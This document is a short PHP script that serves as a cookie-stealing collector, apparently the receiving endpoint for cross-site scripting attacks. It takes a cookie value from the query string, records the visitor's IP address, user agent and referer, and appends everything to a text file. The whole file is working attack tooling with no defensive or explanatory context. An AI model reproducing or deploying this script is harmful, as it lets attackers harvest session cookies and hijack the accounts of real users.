<?php
$cookie = $_GET['cookie'];
$ip = getenv ('REMOTE_ADDR');
$referer=getenv ('HTTP_REFERER');
$agent = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen('cookie.txt', 'a');
fwrite($fp," IP: " .$ip. "\n User Agent:".$agent."\n Referer:". $referer. "\n Cookie: ".$cookie."\n\n\n");
fclose($fp);
?>
